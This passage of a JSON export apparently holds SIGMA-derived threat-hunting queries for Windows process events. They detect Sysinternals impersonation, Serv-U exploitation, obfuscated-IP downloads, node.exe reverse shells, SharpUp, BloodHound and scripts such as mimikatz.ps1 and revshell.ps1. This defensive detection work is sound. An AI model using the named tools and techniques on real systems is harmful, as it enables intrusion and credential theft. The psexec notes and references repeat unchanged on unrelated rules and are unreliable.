            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"svchost.exe\" and tgt.process.image.path contains \"\\svchost.exe\") and (not ((src.process.image.path contains \"\\rpcnet.exe\" or src.process.image.path contains \"\\rpcnetp.exe\") or not (tgt.process.cmdline matches \"\\.*\"))))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 996
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects binaries that use the same name as legitimate sysinternals tools to evade detection",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218",
                "t1202"
            ],
            "name": "Potential Binary Impersonating Sysinternals Tools",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\accesschk.exe\" or tgt.process.image.path contains \"\\accesschk64.exe\" or tgt.process.image.path contains \"\\AccessEnum.exe\" or tgt.process.image.path contains \"\\ADExplorer.exe\" or tgt.process.image.path contains \"\\ADExplorer64.exe\" or tgt.process.image.path contains \"\\ADInsight.exe\" or tgt.process.image.path contains \"\\ADInsight64.exe\" or tgt.process.image.path contains \"\\adrestore.exe\" or tgt.process.image.path contains \"\\adrestore64.exe\" or tgt.process.image.path contains \"\\Autologon.exe\" or tgt.process.image.path contains \"\\Autologon64.exe\" or tgt.process.image.path contains \"\\Autoruns.exe\" or tgt.process.image.path contains \"\\Autoruns64.exe\" or tgt.process.image.path contains \"\\autorunsc.exe\" or tgt.process.image.path contains \"\\autorunsc64.exe\" or tgt.process.image.path contains \"\\Bginfo.exe\" or tgt.process.image.path contains \"\\Bginfo64.exe\" or tgt.process.image.path contains \"\\Cacheset.exe\" or tgt.process.image.path contains \"\\Cacheset64.exe\" or tgt.process.image.path contains \"\\Clockres.exe\" or tgt.process.image.path contains \"\\Clockres64.exe\" or tgt.process.image.path contains \"\\Contig.exe\" or tgt.process.image.path contains \"\\Contig64.exe\" or tgt.process.image.path contains \"\\Coreinfo.exe\" or tgt.process.image.path contains \"\\Coreinfo64.exe\" or tgt.process.image.path contains \"\\CPUSTRES.EXE\" or tgt.process.image.path contains \"\\CPUSTRES64.EXE\" or tgt.process.image.path contains \"\\ctrl2cap.exe\" or tgt.process.image.path contains \"\\Dbgview.exe\" or tgt.process.image.path contains \"\\dbgview64.exe\" or tgt.process.image.path contains \"\\Desktops.exe\" or tgt.process.image.path contains \"\\Desktops64.exe\" or tgt.process.image.path contains \"\\disk2vhd.exe\" or tgt.process.image.path contains \"\\disk2vhd64.exe\" or tgt.process.image.path contains \"\\diskext.exe\" or tgt.process.image.path contains \"\\diskext64.exe\" or tgt.process.image.path contains \"\\Diskmon.exe\" or tgt.process.image.path contains \"\\Diskmon64.exe\" or tgt.process.image.path contains \"\\DiskView.exe\" or tgt.process.image.path contains \"\\DiskView64.exe\" or tgt.process.image.path contains \"\\du.exe\" or tgt.process.image.path contains \"\\du64.exe\" or tgt.process.image.path contains \"\\efsdump.exe\" or tgt.process.image.path contains \"\\FindLinks.exe\" or tgt.process.image.path contains \"\\FindLinks64.exe\" or tgt.process.image.path contains \"\\handle.exe\" or tgt.process.image.path contains \"\\handle64.exe\" or tgt.process.image.path contains \"\\hex2dec.exe\" or tgt.process.image.path contains \"\\hex2dec64.exe\" or tgt.process.image.path contains \"\\junction.exe\" or tgt.process.image.path contains \"\\junction64.exe\" or tgt.process.image.path contains \"\\ldmdump.exe\" or tgt.process.image.path contains \"\\listdlls.exe\" or tgt.process.image.path contains \"\\listdlls64.exe\" or tgt.process.image.path contains \"\\livekd.exe\" or tgt.process.image.path contains \"\\livekd64.exe\" or tgt.process.image.path contains \"\\loadOrd.exe\" or tgt.process.image.path contains \"\\loadOrd64.exe\" or tgt.process.image.path contains \"\\loadOrdC.exe\" or tgt.process.image.path contains \"\\loadOrdC64.exe\" or tgt.process.image.path contains \"\\logonsessions.exe\" or tgt.process.image.path contains \"\\logonsessions64.exe\" or tgt.process.image.path contains \"\\movefile.exe\" or tgt.process.image.path contains \"\\movefile64.exe\" or tgt.process.image.path contains \"\\notmyfault.exe\" or tgt.process.image.path contains \"\\notmyfault64.exe\" or tgt.process.image.path contains \"\\notmyfaultc.exe\" or tgt.process.image.path contains \"\\notmyfaultc64.exe\" or tgt.process.image.path contains \"\\ntfsinfo.exe\" or tgt.process.image.path contains \"\\ntfsinfo64.exe\" or tgt.process.image.path contains \"\\pendmoves.exe\" or tgt.process.image.path contains \"\\pendmoves64.exe\" or tgt.process.image.path contains \"\\pipelist.exe\" or tgt.process.image.path contains \"\\pipelist64.exe\" or tgt.process.image.path contains \"\\portmon.exe\" or tgt.process.image.path contains \"\\procdump.exe\" or tgt.process.image.path contains \"\\procdump64.exe\" or tgt.process.image.path contains \"\\procexp.exe\" or tgt.process.image.path contains \"\\procexp64.exe\" or tgt.process.image.path contains \"\\Procmon.exe\" or tgt.process.image.path contains \"\\Procmon64.exe\" or tgt.process.image.path contains \"\\psExec.exe\" or tgt.process.image.path contains \"\\psExec64.exe\" or tgt.process.image.path contains \"\\psfile.exe\" or tgt.process.image.path contains \"\\psfile64.exe\" or tgt.process.image.path contains \"\\psGetsid.exe\" or tgt.process.image.path contains \"\\psGetsid64.exe\" or tgt.process.image.path contains \"\\psInfo.exe\" or tgt.process.image.path contains \"\\psInfo64.exe\" or tgt.process.image.path contains \"\\pskill.exe\" or tgt.process.image.path contains \"\\pskill64.exe\" or tgt.process.image.path contains \"\\pslist.exe\" or tgt.process.image.path contains \"\\pslist64.exe\" or tgt.process.image.path contains \"\\psLoggedon.exe\" or tgt.process.image.path contains \"\\psLoggedon64.exe\" or tgt.process.image.path contains \"\\psloglist.exe\" or tgt.process.image.path contains \"\\psloglist64.exe\" or tgt.process.image.path contains \"\\pspasswd.exe\" or tgt.process.image.path contains \"\\pspasswd64.exe\" or tgt.process.image.path contains \"\\psping.exe\" or tgt.process.image.path contains \"\\psping64.exe\" or tgt.process.image.path contains \"\\psService.exe\" or tgt.process.image.path contains \"\\psService64.exe\" or tgt.process.image.path contains \"\\psshutdown.exe\" or tgt.process.image.path contains \"\\psshutdown64.exe\" or tgt.process.image.path contains \"\\pssuspend.exe\" or tgt.process.image.path contains \"\\pssuspend64.exe\" or tgt.process.image.path contains \"\\RAMMap.exe\" or tgt.process.image.path contains \"\\RDCMan.exe\" or tgt.process.image.path contains \"\\RegDelNull.exe\" or tgt.process.image.path contains \"\\RegDelNull64.exe\" or tgt.process.image.path contains \"\\regjump.exe\" or tgt.process.image.path contains \"\\ru.exe\" or tgt.process.image.path contains \"\\ru64.exe\" or tgt.process.image.path contains \"\\sdelete.exe\" or tgt.process.image.path contains \"\\sdelete64.exe\" or tgt.process.image.path contains \"\\ShareEnum.exe\" or tgt.process.image.path contains \"\\ShareEnum64.exe\" or tgt.process.image.path contains \"\\shellRunas.exe\" or tgt.process.image.path contains \"\\sigcheck.exe\" or tgt.process.image.path contains \"\\sigcheck64.exe\" or tgt.process.image.path contains \"\\streams.exe\" or tgt.process.image.path contains \"\\streams64.exe\" or tgt.process.image.path contains \"\\strings.exe\" or tgt.process.image.path contains \"\\strings64.exe\" or tgt.process.image.path contains \"\\sync.exe\" or tgt.process.image.path contains \"\\sync64.exe\" or tgt.process.image.path contains \"\\Sysmon.exe\" or tgt.process.image.path contains \"\\Sysmon64.exe\" or tgt.process.image.path contains \"\\tcpvcon.exe\" or tgt.process.image.path contains \"\\tcpvcon64.exe\" or tgt.process.image.path contains \"\\tcpview.exe\" or tgt.process.image.path contains \"\\tcpview64.exe\" or tgt.process.image.path contains \"\\Testlimit.exe\" or tgt.process.image.path contains \"\\Testlimit64.exe\" or tgt.process.image.path contains \"\\vmmap.exe\" or tgt.process.image.path contains \"\\vmmap64.exe\" or tgt.process.image.path contains \"\\Volumeid.exe\" or tgt.process.image.path contains \"\\Volumeid64.exe\" or tgt.process.image.path contains \"\\whois.exe\" or tgt.process.image.path contains \"\\whois64.exe\" or tgt.process.image.path contains \"\\Winobj.exe\" or tgt.process.image.path contains \"\\Winobj64.exe\" or tgt.process.image.path contains \"\\ZoomIt.exe\" or tgt.process.image.path contains \"\\ZoomIt64.exe\") and (not ((tgt.process.publisher in (\"Sysinternals - www.sysinternals.com\",\"Sysinternals\")) or not (tgt.process.publisher matches \"\\.*\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 997
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious process pattern which could be a sign of an exploited Serv-U service",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1555"
            ],
            "name": "Suspicious Serv-U Process Pattern",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\Serv-U.exe\" and (tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\wscript.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\sh.exe\" or tgt.process.image.path contains \"\\bash.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\wmic.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\msiexec.exe\" or tgt.process.image.path contains \"\\forfiles.exe\" or tgt.process.image.path contains \"\\scriptrunner.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 998
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects PowerShell script execution via input stream redirect",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Run PowerShell Script from Redirected Input Stream",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\") and tgt.process.cmdline matches \"\\\\s-\\\\s*<\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 999
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects use of an encoded/obfuscated version of an IP address (hex, octal...) in an URL combined with a download command",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Obfuscated IP Download Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"Invoke-WebRequest\" or tgt.process.cmdline contains \"iwr \" or tgt.process.cmdline contains \"wget \" or tgt.process.cmdline contains \"curl \" or tgt.process.cmdline contains \"DownloadFile\" or tgt.process.cmdline contains \"DownloadString\") and ((tgt.process.cmdline contains \" 0x\" or tgt.process.cmdline contains \"//0x\" or tgt.process.cmdline contains \".0x\" or tgt.process.cmdline contains \".00x\") or (tgt.process.cmdline contains \"http://%\" and tgt.process.cmdline contains \"%2e\") or (tgt.process.cmdline matches \"https?://[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.0[0-9]{3,4}\" or tgt.process.cmdline matches \"https?://[0-9]{1,3}\\\\.0[0-9]{3,7}\" or tgt.process.cmdline matches \"https?://0[0-9]{3,11}\" or tgt.process.cmdline matches \"https?://(0[0-9]{1,11}\\\\.){3}0[0-9]{1,11}\" or tgt.process.cmdline matches \"https?://0[0-9]{1,11}\" or tgt.process.cmdline matches \" [0-7]{7,13}\")) and (not tgt.process.cmdline matches \"https?://((25[0-5]|(2[0-4]|1\\\\d|[1-9])?\\\\d)(\\\\.|\\\\b)){4}\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1000
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution node.exe which is shipped with multiple software such as VMware, Adobe...etc. In order to execute arbitrary code. For example to establish reverse shell as seen in Log4j attacks...etc",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1127"
            ],
            "name": "Potential Arbitrary Code Execution Via Node.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\node.exe\" and (tgt.process.cmdline contains \" -e \" or tgt.process.cmdline contains \" --eval \")) and (tgt.process.cmdline contains \".exec(\" and tgt.process.cmdline contains \"net.socket\" and tgt.process.cmdline contains \".connect\" and tgt.process.cmdline contains \"child_process\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1001
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of SharpUp, a tool for local privilege escalation",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1615",
                "t1569",
                "t1574"
            ],
            "name": "HackTool - SharpUp PrivEsc Tool Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\SharpUp.exe\" or tgt.process.displayName=\"SharpUp\" or (tgt.process.cmdline contains \"HijackablePaths\" or tgt.process.cmdline contains \"UnquotedServicePath\" or tgt.process.cmdline contains \"ProcessDLLHijack\" or tgt.process.cmdline contains \"ModifiableServiceBinaries\" or tgt.process.cmdline contains \"ModifiableScheduledTask\" or tgt.process.cmdline contains \"DomainGPPPassword\" or tgt.process.cmdline contains \"CachedGPPPassword\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1002
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Obfuscated Powershell via VAR++ LAUNCHER",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027",
                "t1059"
            ],
            "name": "Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"&&set\" and tgt.process.cmdline contains \"cmd\" and tgt.process.cmdline contains \"/c\" and tgt.process.cmdline contains \"-f\") and (tgt.process.cmdline contains \"{0}\" or tgt.process.cmdline contains \"{1}\" or tgt.process.cmdline contains \"{2}\" or tgt.process.cmdline contains \"{3}\" or tgt.process.cmdline contains \"{4}\" or tgt.process.cmdline contains \"{5}\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1003
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects command line parameters used by Bloodhound and Sharphound hack tools",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1087",
                "t1087",
                "t1482",
                "t1069",
                "t1069",
                "t1059"
            ],
            "name": "HackTool - Bloodhound/Sharphound Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.displayName contains \"SharpHound\" or tgt.process.displayName contains \"SharpHound\" or (tgt.process.publisher contains \"SpecterOps\" or tgt.process.publisher contains \"evil corp\") or (tgt.process.image.path contains \"\\Bloodhound.exe\" or tgt.process.image.path contains \"\\SharpHound.exe\")) or (tgt.process.cmdline contains \" -CollectionMethod All \" or tgt.process.cmdline contains \" --CollectionMethods Session \" or tgt.process.cmdline contains \" --Loop --Loopduration \" or tgt.process.cmdline contains \" --PortScanTimeout \" or tgt.process.cmdline contains \".exe -c All -d \" or tgt.process.cmdline contains \"Invoke-Bloodhound\" or tgt.process.cmdline contains \"Get-BloodHoundData\") or (tgt.process.cmdline contains \" -JsonFolder \" and tgt.process.cmdline contains \" -ZipFileName \") or (tgt.process.cmdline contains \" DCOnly \" and tgt.process.cmdline contains \" --NoSaveCache \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1004
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious patterns in program names or folders that are often found in malicious samples or hacktools",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Suspicious Program Names",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\CVE-202\" or tgt.process.image.path contains \"\\CVE202\") or (tgt.process.image.path contains \"\\poc.exe\" or tgt.process.image.path contains \"\\artifact.exe\" or tgt.process.image.path contains \"\\artifact64.exe\" or tgt.process.image.path contains \"\\artifact_protected.exe\" or tgt.process.image.path contains \"\\artifact32.exe\" or tgt.process.image.path contains \"\\artifact32big.exe\" or tgt.process.image.path contains \"obfuscated.exe\" or tgt.process.image.path contains \"obfusc.exe\" or tgt.process.image.path contains \"\\meterpreter\")) or (tgt.process.cmdline contains \"inject.ps1\" or tgt.process.cmdline contains \"Invoke-CVE\" or tgt.process.cmdline contains \"pupy.ps1\" or tgt.process.cmdline contains \"payload.ps1\" or tgt.process.cmdline contains \"beacon.ps1\" or tgt.process.cmdline contains \"PowerView.ps1\" or tgt.process.cmdline contains \"bypass.ps1\" or tgt.process.cmdline contains \"obfuscated.ps1\" or tgt.process.cmdline contains \"obfusc.ps1\" or tgt.process.cmdline contains \"obfus.ps1\" or tgt.process.cmdline contains \"obfs.ps1\" or tgt.process.cmdline contains \"evil.ps1\" or tgt.process.cmdline contains \"MiniDogz.ps1\" or tgt.process.cmdline contains \"_enc.ps1\" or tgt.process.cmdline contains \"\\shell.ps1\" or tgt.process.cmdline contains \"\\rshell.ps1\" or tgt.process.cmdline contains \"revshell.ps1\" or tgt.process.cmdline contains \"\\av.ps1\" or tgt.process.cmdline contains \"\\av_test.ps1\" or tgt.process.cmdline contains \"adrecon.ps1\" or tgt.process.cmdline contains \"mimikatz.ps1\" or tgt.process.cmdline contains \"\\PowerUp_\" or tgt.process.cmdline contains \"powerup.ps1\" or tgt.process.cmdline contains \"\\Temp\\a.ps1\" or tgt.process.cmdline contains \"\\Temp\\p.ps1\" or tgt.process.cmdline contains \"\\Temp\\1.ps1\" or tgt.process.cmdline contains \"Hound.ps1\" or tgt.process.cmdline contains \"encode.ps1\" or tgt.process.cmdline contains \"powercat.ps1\"))) | columns tgt.process.cmdline,src.process.cmdline,tgt.process.image.path",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1005
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects updates to Sysmon's configuration. Attackers might update or replace the Sysmon configuration with a bare bone one to avoid monitoring without shutting down the service completely",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Sysmon Configuration Update",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\Sysmon64.exe\" or tgt.process.image.path contains \"\\Sysmon.exe\") or tgt.process.displayName=\"System activity monitor\") and (tgt.process.cmdline contains \"-c\" or tgt.process.cmdline contains \"/c\" or tgt.process.cmdline contains \"\u2013c\" or tgt.process.cmdline contains \"\u2014c\" or tgt.process.cmdline contains \"\u2015c\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1006
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the pattern of UAC Bypass using Event Viewer RecentViews",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "UAC Bypass Using Event Viewer RecentViews",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
